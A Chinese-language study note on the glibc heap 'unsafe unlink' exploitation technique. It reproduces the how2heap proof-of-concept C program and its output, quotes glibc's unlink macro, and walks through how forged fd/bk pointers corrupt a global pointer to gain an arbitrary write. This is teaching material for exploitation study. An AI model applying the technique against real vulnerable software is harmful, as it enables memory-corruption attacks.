# Unlink笔记

### 0x1 分析

现在的Unlink需要的**前提**：

- 在`P`内构造好数据，完成Unlink检验：`FD->bk == P &&  BK->fd == P`。

- 第二个`chunk`的`pre_size`可控，`pre_inuse`位可控。

或者：

- UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 `fd` 和 `bk` 指针
- 已知位置存在一个指针指向可进行 UAF 的 chunk

#### 效果 

使得已指向 UAF `chunk` 的指针 `ptr` 变为 `ptr- 0x18` (x64)

#### 原理分析

how2heap源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
	fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
	fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
	fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	fprintf(stderr, "We create a fake chunk inside chunk0.\n");
	fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	//fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");
	//fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
	//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))\n");
	//fprintf(stderr, "If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).\n");
	//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");
	//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");
	//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");
	//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");
	//chunk0_ptr[1] = sizeof(size_t);
	//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr->size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &chunk0_ptr[1]);
	//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");

	fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	fprintf(stderr, "Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	fprintf(stderr, "New Value: %s\n",victim_string);
}
```

```shell
➜  glibc_2.26 git:(master) ✗ ./unsafe_unlink
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x555555756030, pointing to 0x555555757010
The victim chunk we are going to corrupt is at 0x5555557570a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x555555756018
Fake chunk bk: 0x555555756020

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

首先我们`free(chunk1_ptr)`的时候，我们发现：

会后向合并，也就来到了`Unlink`部分：

由于`chunk1_hdr[0] = malloc_size;`，`P`在`chunk1`里已经被重置了`pre_size`，

`chunk1_hdr[1] &= ~1;`也已经在`chunk1`中将`pre_inuse`置为已经被`free`掉。可以进行Unlink。

```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(p, bck, fwd);
    }
```

然后看看`Unlink`:

```c
#define unlink(P, BK, FD) 
{                                            
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr (check_action, "corrupted double-linked list", P);      
    else {								      
        FD->bk = BK;							      
        BK->fd = FD;	
      /*这部分是检测large chunk的
        if (!in_smallbin_range (P->size)				      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      
            assert (P->fd_nextsize->bk_nextsize == P);			      
            assert (P->bk_nextsize->fd_nextsize == P);			      
            if (FD->fd_nextsize == NULL) {				      
                if (P->fd_nextsize == P)				      
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      
                else {							      
                    FD->fd_nextsize = P->fd_nextsize;			      
                    FD->bk_nextsize = P->bk_nextsize;			      
                    P->fd_nextsize->bk_nextsize = FD;			      
                    P->bk_nextsize->fd_nextsize = FD;			      
                  }							      
              } else {							      
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
              }								      
          }	*/							      
      }									      
}
```

显然我们需要满足：

`FD->bk == P &&  BK->fd == P`

所以在`P`里构造了：

`chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);`

`chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);`

满足这些条件后实际的代码就是这样：

```c
FD = P->fd == (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);								      
BK = P->bk == (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);	
FD->bk == (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3) + (sizeof(uint64_t)*3) == chunk0_ptr = BK;							      
BK->fd == (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2) + (sizeof(uint64_t)*2) == chunk0_ptr= FD;
```

在最后一步完成了：

`chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3)`

`chunk0_ptr`一开始指向`chunk0`，现在指向了`&chunk0_ptr-(sizeof(uint64_t)*3)`。